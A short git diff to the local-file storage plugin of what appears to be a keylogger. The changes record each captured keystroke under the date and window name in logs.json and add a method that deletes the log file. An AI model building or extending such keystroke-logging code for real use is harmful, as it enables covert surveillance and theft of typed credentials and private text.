@@ -1,4 +1,5 @@
 import json
+import os
 from datetime import date
 
 from plugins.plugin_base import PluginBase
@@ -11,8 +12,8 @@ class LocalFile(PluginBase):
     buffer structure - {date: {windows name: [list of keystrokes]}}
     """
 
-    def __init__(self, path="logs.json"):
-        self.path = path
+    def __init__(self, path: str = "logs.json"):
+        self.__path = path
         try:
             self.buffer = json.load(open(path, "r"))
         except (FileNotFoundError, json.decoder.JSONDecodeError):
@@ -24,4 +25,15 @@ class LocalFile(PluginBase):
         if window not in self.buffer[str(date.today())]:  # check if window already in dict
             self.buffer[str(date.today())][window] = list()
 
-        json.dump(self.buffer, open(self.path, "w"))
+        self.buffer[str(date.today())][window].append(key)  # add event to buffer
+        json.dump(self.buffer, open(self.__path, "w"))
+
+    def close(self):
+        """
+        Deletes log file
+        """
+        os.remove(self.__path)
+
+    @property
+    def path(self) -> str:
+        return self.__path
